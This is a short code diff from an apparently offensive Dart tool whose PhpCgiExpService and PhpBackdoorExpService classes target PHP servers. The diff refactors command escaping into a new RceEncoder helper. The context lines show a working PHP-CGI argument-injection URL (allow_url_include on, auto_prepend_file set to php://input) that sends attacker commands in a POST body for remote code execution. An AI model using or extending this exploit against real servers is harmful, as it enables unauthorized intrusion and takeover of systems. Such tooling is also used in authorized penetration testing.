@@ -1,6 +1,7 @@
 import 'package:http/http.dart' as http;
 
 import 'exp_result.dart';
+import 'rce_encoder.dart';
 
 class PhpBackdoorExpService {
   final String baseUrl;
@@ -82,9 +83,7 @@ class PhpCgiExpService {
     try {
       final url =
           '$_base$phpPath?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input';
-      // Escape backslashes and double quotes so they survive inside the PHP
-      // double-quoted string literal.
-      final escaped = cmd.replaceAll(r'\', r'\\').replaceAll('"', r'\"');
+      final escaped = RceEncoder.escapeDoubleQuoted(cmd);
       final res = await http
           .post(
             Uri.parse(url),
